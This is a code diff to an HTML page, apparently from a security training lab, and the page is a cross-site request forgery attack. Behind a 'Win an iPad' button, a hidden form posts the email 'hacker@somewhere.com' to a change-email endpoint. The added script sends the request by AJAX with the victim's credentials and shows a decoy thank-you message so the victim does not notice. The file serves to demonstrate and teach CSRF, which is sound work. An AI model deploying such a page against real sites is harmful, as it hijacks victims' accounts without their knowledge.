@@ -1,14 +1,45 @@
 <!DOCTYPE HTML>
 <html lang="en-us">
-	<head>
-		<meta http-equiv="Content-type" content="text/html; charset=utf-8">
-		<title>{{title}}</title>
-        <link rel="stylesheet" href="/stylesheets/style.css"></link>
-	</head>
-	<body>
-		<form action="http://harmless:2017/csrf/change-email" method="POST">
-            <input type="hidden" name="email" value="hacker@somewhere.com" />
-            <input type="submit" value="Win an iPad" />
-        </form>
-	</body>
+
+<head>
+	<meta http-equiv="Content-type" content="text/html; charset=utf-8">
+	<link rel="stylesheet" href="/stylesheets/style.css"></link>
+	<script src="https://code.jquery.com/jquery-3.1.1.js"
+    integrity="sha256-16cdPddA6VdVInumRGo6IbivbERE8p7CQR3HzTBuELA=" crossorigin="anonymous">
+	</script>
+</head>
+
+<body>
+	<form action="http://harmless:2017/csrf/change-email" method="POST">
+		<input type="hidden" name="email" value="hacker@somewhere.com" />
+		<input type="submit" value="Win an iPad" />
+	</form>
+	<h1 class="message" style="display:none">Thanks! We'll have our people call your people.</h1>
+	<script>
+		$(document).ready(function() {
+			$("form").on("submit", function(event) {
+
+                event.preventDefault();
+
+				var $form = $(this);
+				var data = $form.serialize();
+				var url = $form.attr('action');
+
+                $.ajax(
+                    {
+                      type: "POST",
+                      url: url,
+                      data: data,
+                      xhrFields: {
+                           withCredentials: true
+                      },
+                      crossDomain: true
+                    }
+                );
+                $(".message").show();
+			});
+		});
+	</script>
+</body>
+
 </html>
